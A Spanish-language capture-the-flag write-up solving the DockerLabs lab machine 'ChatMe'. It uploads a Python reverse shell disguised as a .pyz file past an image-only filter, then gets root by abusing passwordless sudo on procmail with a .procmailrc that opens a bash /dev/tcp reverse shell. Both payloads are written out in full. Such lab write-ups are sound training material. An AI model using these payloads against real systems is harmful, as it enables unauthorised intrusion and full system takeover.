## Introducción

Este documento presenta la resolución completa de la máquina **ChatMe**, desarrollada por *Pylon & Zunderrub* para la plataforma **DockerLabs**, clasificada con una dificultad **Media**.
El laboratorio expone un servidor web que, tras la enumeración de subdominios, revela una aplicación de chat en `chat.chatme.dl`. Esta aplicación permite la subida de archivos, pero restringe las extensiones a tipos de imagen. Mediante el uso de la extensión `.pyz`, se logra el bypass del filtro y la subida de una reverse shell en Python, obteniendo acceso como `www-data`.
Una vez dentro, se identifica una configuración insegura de `sudo` que permite ejecutar `procmail` como root sin autenticación. Aprovechando esta herramienta y un archivo `.procmailrc` malicioso, se ejecuta una segunda reverse shell con privilegios de `root`, completando la escalada de privilegios.
Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.

## Paso 0 — Despliegue y preparación

Se descomprime la máquina y se despliega utilizando el script proporcionado:

```bash
unzip ChatMe.zip
sudo bash auto_deploy.sh ChatMe.tar
```

Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.

![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1762582724/Ip_qrhpof.png)

Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:

```bash
mkdir -p ChatMe/{content,exploits,nmap,scripts}
cd ChatMe
```

## Paso 1 — Reconocimiento

### 1.1 Escaneo de puertos

Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n 172.17.0.2 -oG allPorts
extractPorts allPorts
```

El resultado muestra los siguientes servicios accesibles externamente:

* **80/tcp** — HTTP

![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1767755060/Ports_rbidmx.png)

---

### 1.2 Enumeración de servicios

Se realiza un escaneo detallado de los servicios identificados:

```bash
nmap -sCV -p80 172.17.0.2 -oN targeted
```

---

### 1.3 Enumeración de subdominios

Se identifica el dominio `chatme.dl` en el código fuente. Se agrega al `/etc/hosts`:

```bash
echo "172.17.0.2 chatme.dl" | sudo tee -a /etc/hosts
```

Se realiza una enumeración de subdominios:

```bash
gobuster vhost -u http://chatme.dl/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain -r
```

![Gobuster](https://res.cloudinary.com/dewqswzke/image/upload/v1767754960/Gobuster_kvegia.png)

Se descubre el subdominio `chat.chatme.dl`. Se agrega al `/etc/hosts`:

```bash
echo "172.17.0.2 chat.chatme.dl" | sudo tee -a /etc/hosts
```

### 1.4 Enumeración web

Se accede a `http://chat.chatme.dl` y se encuentra una aplicación de chat. Se realiza un escaneo de directorios:

```bash
feroxbuster -u http://chat.chatme.dl \

  -x php,html,js,txt \
```

## Paso 2 — Explotación (Acceso inicial)

### 2.1 Identificación de vulnerabilidad de upload

La aplicación permite adjuntar archivos, pero solo acepta tipos de imagen. Se intenta subir una reverse shell en `.pyz` (archivo Python comprimido), logrando el bypass del filtro.

**Contenido de `shell.pyz`:**

```python
import os
import socket
import subprocess

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("172.17.0.1", 443))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/sh", "-i"])
```

### 2.2 Reverse shell

Se inicia un listener en la máquina atacante:

```bash
nc -nlvp 443
```

Se sube el archivo `shell.pyz` a través de la aplicación de chat.

![Reverse shell](https://res.cloudinary.com/dewqswzke/image/upload/v1767755197/ReverseShell_pqbxsn.png)

## Paso 3 — Escalada de privilegios

### 3.1 De www-data → root

Se verifican los permisos sudo:

```bash
sudo -l
```

![Sudo -l](https://res.cloudinary.com/dewqswzke/image/upload/v1767755468/sudo-l_r40qlk.png)

El usuario puede ejecutar `procmail` como root sin contraseña.

Se crea un archivo `.procmailrc` malicioso:

```bash
cat > .procmailrc << 'EOF'
:0
| /bin/bash -c "/bin/bash -i >& /dev/tcp/172.17.0.1/1337 0>&1"
EOF
```

Se inicia un segundo listener en la máquina atacante:

```bash
nc -nlvp 1337
```

Se ejecuta `procmail` con el archivo malicioso:

```bash
echo '' | sudo -u root /usr/bin/procmail -m .procmailrc
```

![Root reverse shell](https://res.cloudinary.com/dewqswzke/image/upload/v1767755332/RootReverse_jl8mkc.png)
